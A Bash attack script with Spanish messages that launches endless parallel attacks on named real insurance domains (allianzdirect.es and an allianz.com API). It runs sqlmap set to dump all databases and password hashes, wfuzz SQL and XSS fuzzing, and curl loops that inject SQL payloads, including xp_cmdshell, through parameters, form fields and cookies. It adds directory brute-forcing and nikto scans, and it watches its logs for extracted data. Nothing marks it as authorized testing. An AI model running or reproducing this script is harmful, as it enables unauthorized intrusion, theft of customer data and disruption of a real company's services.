#!/bin/bash

echo "[!] ATAQUE ETERNO INICIADO - NO SE DETENDRÁ JAMÁS"
echo "[!] MÚLTIPLES VECTORES DE ATAQUE EN PARALELO"
echo "================================================================"

# Función para ataque SQLMap continuo
sqlmap_eternal() {
    while true; do
        echo "[SQLMap] Intentando con diferentes parámetros..."
        
        # Lista de URLs objetivo
        URLS=(
            "https://www.allianzdirect.es/account/?v=1"
            "https://www.allianzdirect.es/login/?user=test"
            "https://www.allianzdirect.es/api/users?id=1"
            "https://www.allianzdirect.es/search/?q=test"
            "https://pro-edp.apis.allianz.com/prod/?id=1"
        )
        
        for url in "${URLS[@]}"; do
            sqlmap -u "$url" \
                --batch \
                --random-agent \
                --level=5 \
                --risk=3 \
                --threads=10 \
                --tamper=space2comment,between,charencode,charunicodeencode \
                --technique=BEUSTQ \
                --current-db \
                --current-user \
                --passwords \
                --dump-all \
                --hex \
                --no-cast \
                --crawl=5 \
                --forms \
                --fresh-queries \
                --flush-session \
                2>&1 | grep -E "(Database|Table|Column|retrieved|found|extracted)" >> sqlmap_results.log
        done
        
        sleep 2
    done
}

# Función para fuzzing continuo
fuzzing_eternal() {
    while true; do
        echo "[Fuzzing] Probando con diferentes wordlists..."
        
        # SQL Injection fuzzing
        wfuzz -c \
            -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
            --hc 404,403 \
            -t 50 \
            https://www.allianzdirect.es/account/?v=FUZZ \
            2>&1 | grep -E "200|sql|SQL|error" >> wfuzz_results.log
        
        # XSS fuzzing
        wfuzz -c \
            -z file,/usr/share/wordlists/wfuzz/Injections/XSS.txt \
            --hc 404,403 \
            -t 50 \
            https://www.allianzdirect.es/search/?q=FUZZ \
            2>&1 | grep -E "200|script|alert" >> wfuzz_results.log
        
        sleep 2
    done
}

# Función para ataque manual continuo
manual_eternal() {
    while true; do
        echo "[Manual] Probando payloads manuales..."
        
        # Array de payloads
        PAYLOADS=(
            "' OR '1'='1"
            "' OR 1=1--"
            "admin' OR '1'='1"
            "' UNION SELECT NULL,database(),NULL--"
            "' UNION SELECT NULL,user(),NULL--"
            "' UNION SELECT NULL,@@version,NULL--"
            "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
            "'; EXEC xp_cmdshell('whoami')--"
            "' AND SLEEP(5)--"
        )
        
        ENDPOINTS=(
            "https://www.allianzdirect.es/account/"
            "https://www.allianzdirect.es/login/"
            "https://www.allianzdirect.es/api/"
            "https://www.allianzdirect.es/admin/"
            "https://pro-edp.apis.allianz.com/prod/"
        )
        
        for endpoint in "${ENDPOINTS[@]}"; do
            for payload in "${PAYLOADS[@]}"; do
                # GET request
                curl -s -X GET "${endpoint}?id=${payload}" \
                    -H "User-Agent: Mozilla/5.0" \
                    -H "X-Forwarded-For: 127.0.0.1" \
                    2>&1 | grep -iE "sql|error|syntax|database|table|column|select|from|where" >> manual_results.log
                
                # POST request
                curl -s -X POST "${endpoint}" \
                    -d "username=${payload}&password=test" \
                    -H "Content-Type: application/x-www-form-urlencoded" \
                    2>&1 | grep -iE "sql|error|syntax|database|table|column|select|from|where" >> manual_results.log
                
                # Cookie injection
                curl -s "${endpoint}" \
                    -H "Cookie: user=${payload}" \
                    2>&1 | grep -iE "sql|error|syntax|database|table|column|select|from|where" >> manual_results.log
            done
        done
        
        sleep 2
    done
}

# Función para escaneo de directorios
dirbuster_eternal() {
    while true; do
        echo "[DirBuster] Buscando directorios ocultos..."
        
        gobuster dir \
            -u https://www.allianzdirect.es \
            -w /usr/share/wordlists/dirb/common.txt \
            -t 50 \
            --timeout 10s \
            -q \
            2>&1 | grep -E "Status: 200|Status: 301|Status: 302" >> gobuster_results.log
        
        dirb https://www.allianzdirect.es \
            /usr/share/wordlists/dirb/common.txt \
            -N 404 \
            2>&1 | grep -E "FOUND|CODE:200" >> dirb_results.log
        
        sleep 5
    done
}

# Función para nikto scan
nikto_eternal() {
    while true; do
        echo "[Nikto] Escaneando vulnerabilidades..."
        
        nikto -h https://www.allianzdirect.es \
            -Tuning 123456789 \
            -timeout 10 \
            -maxtime 300 \
            2>&1 | grep -E "vulnerability|exploit|injection|overflow" >> nikto_results.log
        
        sleep 60
    done
}

# Función para monitorear resultados
monitor_results() {
    while true; do
        echo ""
        echo "[Monitor] Verificando resultados..."
        
        # Verificar si se encontraron datos
        if grep -q "Database:" sqlmap_results.log 2>/dev/null; then
            echo "[!] DATOS ENCONTRADOS EN SQLMAP!"
            cat sqlmap_results.log | grep -E "Database:|Table:|Column:" | tail -20
        fi
        
        if grep -q "200" wfuzz_results.log 2>/dev/null; then
            echo "[!] VULNERABILIDADES ENCONTRADAS EN WFUZZ!"
            cat wfuzz_results.log | grep "200" | tail -10
        fi
        
        if grep -q "sql" manual_results.log 2>/dev/null; then
            echo "[!] POSIBLES ERRORES SQL EN ATAQUE MANUAL!"
            cat manual_results.log | grep -i "sql" | tail -10
        fi
        
        sleep 10
    done
}

# Limpiar logs anteriores
> sqlmap_results.log
> wfuzz_results.log
> manual_results.log
> gobuster_results.log
> dirb_results.log
> nikto_results.log

# Lanzar todos los ataques en paralelo
echo "[*] Lanzando todos los vectores de ataque..."

sqlmap_eternal &
PID1=$!
echo "[+] SQLMap eternal PID: $PID1"

fuzzing_eternal &
PID2=$!
echo "[+] Fuzzing eternal PID: $PID2"

manual_eternal &
PID3=$!
echo "[+] Manual eternal PID: $PID3"

dirbuster_eternal &
PID4=$!
echo "[+] DirBuster eternal PID: $PID4"

nikto_eternal &
PID5=$!
echo "[+] Nikto eternal PID: $PID5"

monitor_results &
PID6=$!
echo "[+] Monitor PID: $PID6"

echo ""
echo "[*] TODOS LOS ATAQUES LANZADOS - NO SE DETENDRÁN"
echo "[*] PIDs: $PID1 $PID2 $PID3 $PID4 $PID5 $PID6"
echo "[*] Para detener: kill $PID1 $PID2 $PID3 $PID4 $PID5 $PID6"
echo ""
echo "[*] Logs:"
echo "    - sqlmap_results.log"
echo "    - wfuzz_results.log"
echo "    - manual_results.log"
echo "    - gobuster_results.log"
echo "    - dirb_results.log"
echo "    - nikto_results.log"
echo ""
echo "[*] El ataque continuará ETERNAMENTE..."

# Esperar indefinidamente
wait